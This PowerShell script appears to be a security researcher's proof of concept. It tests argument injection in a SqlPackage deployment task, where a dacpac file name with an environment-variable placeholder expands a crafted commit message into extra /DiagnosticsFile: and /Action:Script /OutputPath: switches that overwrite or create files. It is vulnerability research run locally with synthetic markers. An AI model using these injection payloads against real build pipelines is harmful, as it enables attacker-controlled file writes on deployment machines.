# Ceiling probe. The executed leg already proves an attacker-chosen file write via
# /DiagnosticsFile:. This asks how far the primitive goes: does it OVERWRITE an existing
# file, does SqlPackage accept a SECOND /Action: injected ahead of Microsoft's own, and can
# /Action:Script /OutputPath: be reached so the written CONTENT is attacker derived.
# Everything is local, synthetic markers only, nothing fetched from the network.

$ErrorActionPreference = 'Continue'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$work = Join-Path $env:RUNNER_TEMP ("ceil-" + [guid]::NewGuid().ToString('N').Substring(0,8))
New-Item -ItemType Directory -Force -Path (Join-Path $work 'db') | Out-Null
Write-Output ("PSVersion : " + $PSVersionTable.PSVersion + "   PSEdition : " + $PSVersionTable.PSEdition)

$sqlPackage = (Get-ChildItem "C:\Program Files\Microsoft SQL Server\*\DAC\bin\SqlPackage.exe" | Select-Object -First 1).FullName
Write-Output ("SqlPackage.exe  : " + $sqlPackage)
Write-Output ("file version    : " + (Get-Item $sqlPackage).VersionInfo.FileVersion)

$nupkg = Join-Path $here 'taskmodulesqlutility-0.1.7.nupkg'
Copy-Item $nupkg (Join-Path $work 'pkg.zip')
Expand-Archive -Path (Join-Path $work 'pkg.zip') -DestinationPath (Join-Path $work 'pkg') -Force
$modFile = (Get-ChildItem -Recurse -Path (Join-Path $work 'pkg') -Filter 'SqlPackageOnTargetMachines.ps1' | Select-Object -First 1).FullName
Write-Output ("module sha256   : " + (Get-FileHash -Algorithm SHA256 $modFile).Hash.ToLower())
function Get-LiftedText([string]$file, [string[]]$names) {
    $tok = $null; $err = $null
    $ast = [System.Management.Automation.Language.Parser]::ParseFile($file, [ref]$tok, [ref]$err)
    $fns = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
    $parts = @()
    foreach ($name in $names) {
        $f = $fns | Where-Object { $_.Name -eq $name } | Select-Object -First 1
        Write-Host ("  lifted verbatim : $name lines $($f.Extent.StartLineNumber)-$($f.Extent.EndLineNumber)")
        $parts += $f.Extent.Text
    }
    return ($parts -join "`r`n")
}
. ([scriptblock]::Create((Get-LiftedText $modFile @('Get-SqlPackageCmdArgs','ExecuteCommand'))))

function RunLeg([string]$label, [string]$fileName, [string]$commitMsg, [string]$server) {
    Write-Host ""
    Write-Host "================ $label"
    Write-Host ("  committed file name : " + $fileName)
    Write-Host ("  commit message      : " + $commitMsg)
    $env:BUILD_SOURCEVERSIONMESSAGE = $commitMsg
    $dacpac = Join-Path $work ("db\" + $fileName)
    $a = Get-SqlPackageCmdArgs -dacpacFile $dacpac -targetMethod 'server' -serverName $server -databaseName 'Fabrikam' -additionalArguments ''
    Write-Host ("  argument string     : " + $a)
    try { $out = ExecuteCommand -FileName $sqlPackage -Arguments $a } catch { $out = "$_" }
    ($out -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 8 | ForEach-Object { Write-Host ("  out> " + $_.Trim()) }
}

# ---------------------------------------------------------------- A. overwrite semantics
Write-Output ""
Write-Output "########## A. does /DiagnosticsFile: OVERWRITE an existing file"
$victimDir = Join-Path $work 'victim'
New-Item -ItemType Directory -Force -Path $victimDir | Out-Null
$victim = Join-Path $victimDir 'existing.dacpac'
Set-Content -Path $victim -Value 'ORIGINAL-CONTENT-LINE-1' -Encoding ASCII
Write-Output ("  pre  bytes : " + (Get-Item $victim).Length + "   content : " + (Get-Content $victim -Raw).Trim())
RunLeg 'A1 INJECT  /DiagnosticsFile: aimed at an EXISTING file' 'Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac' ('x" /Diagnostics:True /DiagnosticsFile:"' + (Join-Path $victimDir 'existing')) 'localhost\NOSUCHINSTANCE'
if (Test-Path $victim) {
  Write-Output ("  post bytes : " + (Get-Item $victim).Length)
  Write-Output ("  ORIGINAL LINE STILL PRESENT : " + ((Get-Content $victim -Raw) -match 'ORIGINAL-CONTENT-LINE-1'))
  (Get-Content $victim -TotalCount 3) | ForEach-Object { Write-Output ("    head> " + $_) }
} else { Write-Output "  victim file GONE" }

# ---------------------------------------------------------------- B. duplicate /Action:
Write-Output ""
Write-Output "########## B. does SqlPackage accept a SECOND /Action: injected AHEAD of Microsoft's"
Write-Output "  direct invocation, no injection, just to read the binary's own rule:"
$b = & $sqlPackage '/Action:Script' '/Action:Publish' '/SourceFile:nosuch.dacpac' '/TargetServerName:localhost\NOSUCHINSTANCE' '/TargetDatabaseName:Fabrikam' 2>&1
($b -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 6 | ForEach-Object { Write-Output ("  out> " + $_.Trim()) }
Write-Output ("  exit code : " + $LASTEXITCODE)

# ---------------------------------------------------------------- C. is there a real SQL Server here
Write-Output ""
Write-Output "########## C. local SQL instance availability"
$sqlcmd = Get-Command sqlcmd.exe -ErrorAction SilentlyContinue
Write-Output ("  sqlcmd on PATH : " + ($null -ne $sqlcmd))
$localdb = Get-Command SqlLocalDB.exe -ErrorAction SilentlyContinue
Write-Output ("  SqlLocalDB.exe : " + ($null -ne $localdb))
if ($localdb) {
  & SqlLocalDB.exe info 2>&1 | ForEach-Object { Write-Output ("  info> " + $_) }
  & SqlLocalDB.exe create MSRCLAB 2>&1 | ForEach-Object { Write-Output ("  create> " + $_) }
  & SqlLocalDB.exe start  MSRCLAB 2>&1 | ForEach-Object { Write-Output ("  start> " + $_) }
}
Get-Service -Name 'MSSQL*' -ErrorAction SilentlyContinue | ForEach-Object { Write-Output ("  service> " + $_.Name + " " + $_.Status) }

# ---------------------------------------------------------------- D. /Action:Script /OutputPath: through the injection
Write-Output ""
Write-Output "########## D. reach /Action:Script /OutputPath: so the CONTENT is attacker derived"
$target = '(localdb)\MSRCLAB'
$scriptOut = Join-Path $victimDir 'generated.sql'
# The attacker commits a SECOND real dacpac whose name is the truncation prefix, so /SourceFile:
# still resolves after the quote breaks Microsoft's quoted region.
Write-Output "  D0 build a real source dacpac by extracting an empty localdb database"
$srcDac = Join-Path $work 'db\Fab.dacpac'
$e = & $sqlPackage '/Action:Extract' "/SourceServerName:$target" '/SourceDatabaseName:master' "/TargetFile:$srcDac" '/p:ExtractAllTableData=False' 2>&1
($e -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 5 | ForEach-Object { Write-Output ("  out> " + $_.Trim()) }
Write-Output ("  source dacpac exists : " + (Test-Path $srcDac))
if (Test-Path $srcDac) { Write-Output ("  source dacpac bytes  : " + (Get-Item $srcDac).Length) }

RunLeg 'D1 INJECT  /Action:Script /OutputPath: with a resolvable /SourceFile:' 'Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac' ('.dacpac" /Action:Script /OutputPath:"' + $scriptOut + '" /q:"') $target
Write-Output ("  GENERATED SCRIPT WRITTEN : " + (Test-Path $scriptOut))
if (Test-Path $scriptOut) {
  Write-Output ("    bytes : " + (Get-Item $scriptOut).Length)
  (Get-Content $scriptOut -TotalCount 8) | ForEach-Object { Write-Output ("    head> " + $_) }
}

# ---------------------------------------------------------------- E. control: no percent signs
Write-Output ""
Write-Output "########## E. CONTROL, same bytes, percent signs removed from the file name"
Remove-Item $scriptOut -Force -ErrorAction SilentlyContinue
RunLeg 'E1 CONTROL same commit message, file name WITHOUT percent signs' 'FabBUILD_SOURCEVERSIONMESSAGE.dacpac' ('.dacpac" /Action:Script /OutputPath:"' + $scriptOut + '" /q:"') $target
Write-Output ("  GENERATED SCRIPT WRITTEN : " + (Test-Path $scriptOut))

Write-Output ""
Write-Output "DONE"
exit 0
